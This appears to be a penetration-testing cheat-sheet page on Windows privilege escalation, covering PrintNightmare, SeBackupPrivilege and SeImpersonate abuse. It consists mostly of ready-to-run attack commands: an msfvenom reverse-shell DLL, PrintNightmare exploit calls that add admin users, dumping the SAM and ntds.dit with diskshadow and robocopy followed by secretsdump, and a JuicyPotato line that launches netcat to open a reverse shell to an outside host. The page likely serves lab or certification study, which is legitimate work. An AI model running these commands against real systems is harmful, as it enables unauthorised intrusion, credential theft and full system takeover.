# Windows

## PrintNightmare (CVE-2021-1675)

{% embed url="https://github.com/cube0x0/CVE-2021-1675" %}

We can use `rpcdump.py` from impacket to scan for potential vulnerable hosts, if it returns a value, it could be vulnerable

```
rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```

#### Install their version of Impacket

```bash
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

#### Create a malicious .dll&#x20;

{% code overflow="wrap" %}
```python
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f dll > shell.dll
```
{% endcode %}

#### Host a smbserver

```
impacket-smbserver share . -smb2support
```

{% code overflow="wrap" %}
```python
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'

./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
```
{% endcode %}

{% embed url="https://github.com/calebstewart/CVE-2021-1675" %}

```powershell
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default

Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure" 
```

## SeBackupPrivilege

{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" %}

#### Method 1

#### Standalone Windows Box

```
# on victim
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system

download sam
download system

# on kali
pypykatz registry --sam sam system
```

#### Domain Controller

This privilege only allows you to make backups not copies

```
# on kali
nano pwn.dsh
set context persistent nowriters
add volume c: alias pwn
create
expose %pwn% z:
unix2dos pwn.dsh

# on victim
cd C:\Temp
upload pwn.dsh
diskshadow /s pwn.dsh
robocopy /b z:\windows\ntds . ntds.dit

reg save hklm\system c:\Temp\system
cd C:\Temp
download ntds.dit
download system

# on kali
impacket-secretsdump -ntds ntds.dit -system system local
```

#### Method 2

{% embed url="https://github.com/giuliano108/SeBackupPrivilege" %}

```
# on kali
nano pwn.dsh
set context persistent nowriters
add volume c: alias pwn
create
expose %pwn% z:
unix2dos pwn.dsh

# on victim
cd C:\Temp
upload pwn.dsh
upload SeBackupPrivilegeUtils.dll
upload SeBackupPrivilegeCmdLets.dll

Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
diskshadow /s pwn.dsh

Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
reg save hklm\system c:\Temp\system
cd C:\Temp
download ntds.dit
download system

# on kali
impacket-secretsdump -ntds ntds.dit -system system local
```

## SeImpersonateToken

SeImpersonateToken or SeAssignPrimaryToken - Enabled

### Exploiting with Juicy Potato

[http://ohpe.it/juicy-potato/\
http://ohpe.it/juicy-potato/CLSID\
https://github.com/ivanitlearning/Juicy-Potato-x86/releases](http://ohpe.it/juicy-potato/http://ohpe.it/juicy-potato/CLSIDhttps:/github.com/ivanitlearning/Juicy-Potato-x86/releases)

We need to specify CLSID value with systeminfo. It changes with Windows versions.

```
LocalService CLSID
BITS	{4991d34b-80a1-4291-83b6-3328366b9097}	NT AUTHORITY\SYSTEM

Checking...
JuicyPotatox86.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
[+] CreateProcessWithTokenW OK

JuicyPotatox86.exe -l 1337 -p C:\windows\temp\nc.exe -a "-e cmd 192.168.1.1 80" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
```

### Exploiting with PrintSpoofer.exe

The target machine's arch is need to be x64.

[https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

```
PrintSpoofer.exe -i -c cmd
\\192.168.1.1\Share\PrintSpoofer.exe -i -c cmd
```
